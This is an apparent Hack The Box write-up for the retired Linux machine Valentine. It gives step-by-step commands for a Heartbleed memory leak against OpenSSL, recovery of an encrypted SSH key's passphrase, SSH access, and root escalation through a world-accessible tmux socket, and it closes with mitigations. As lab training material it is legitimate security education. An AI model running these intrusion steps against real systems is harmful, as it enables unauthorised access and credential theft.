---
machine: Valentine
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, heartbleed, cve-2014-0160, rsa-key, ssh, tmux, dirtycow]
---

# Valentine — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Two clues collide: `/dev/` serves an **encrypted RSA private key** (hex-encoded) and port 443 runs OpenSSL 1.0.1, vulnerable to **Heartbleed (CVE-2014-0160)**. The memory leak returns the key's passphrase; decrypt the key and SSH in as `hype`. Escalation is a root **tmux** socket with loose permissions: `tmux -S /.devs/dev_sess` and you are root (DirtyCow also worked on that kernel).

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
nmap -p443 --script ssl-heartbleed <IP>
```

```text
22/tcp  open  ssh    OpenSSH 5.9p1 Debian 5ubuntu1.10
80/tcp  open  http   Apache httpd 2.2.22 (Ubuntu)
443/tcp open  https  Apache httpd 2.2.22  → ssl-heartbleed: VULNERABLE
```

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt
curl http://<IP>/dev/
```

`/dev/` lists `hype_key` and `notes.txt`. The site also has an encoder and a decoder (`/encode.php`, `/decode.php`), the hint that whatever is submitted passes through memory.

## Access

1. **Heartbleed** against 443 with any public implementation (Python PoC, `nmap --script ssl-heartbleed`, Metasploit):

```bash
python2 heartbleed.py <IP> -p 443 | tee leak.txt
strings leak.txt | grep -i 'heartbleed'
```

2. **Key passphrase**: the dump holds a base64 string that decodes to the passphrase (`heartbleedbelievethehype` on this box). The site's own decoder confirms it.

3. **Decrypt the key**: `hype_key` is hex.

```bash
cat hype_key | xxd -r -p > hype_key.pem
openssl rsa -in hype_key.pem -out hype_key_dec.pem
```

4. **SSH as `hype`**: the server only accepts legacy `ssh-rsa`.

```bash
ssh -i hype_key_dec.pem -o PubkeyAcceptedKeyTypes=+ssh-rsa hype@<IP>
```

## Escalation

```bash
cat ~/.bash_history
```

The history points at a root-owned tmux socket:

```bash
ls -l /.devs/dev_sess
tmux -S /.devs/dev_sess
```

```text
root@Valentine:~#
```

## Pitfalls

- **Deprecated `ssh-rsa`**: a modern client rejects the key with "no mutual signature algorithm"; re-enable the legacy algorithm.
- **Hex, not PEM**: `hype_key` does not open with `openssl` directly; run `xxd -r -p` first.
- **Passphrase**: it may be split across leaks; repeat the attack and filter printable strings.
- **DirtyCow**: the kernel is old and the exploit also works, but the tmux socket is faster and less risky.

## Lessons

- Heartbleed does not only leak session keys: any secret that passed through the TLS process can come out.
- Publishing a private key, even encrypted, reduces the problem to cracking the passphrase.
- A tmux socket writable by other users is effectively root.
- Mitigation: patch OpenSSL, never serve cryptographic material from the webroot, and protect session sockets.
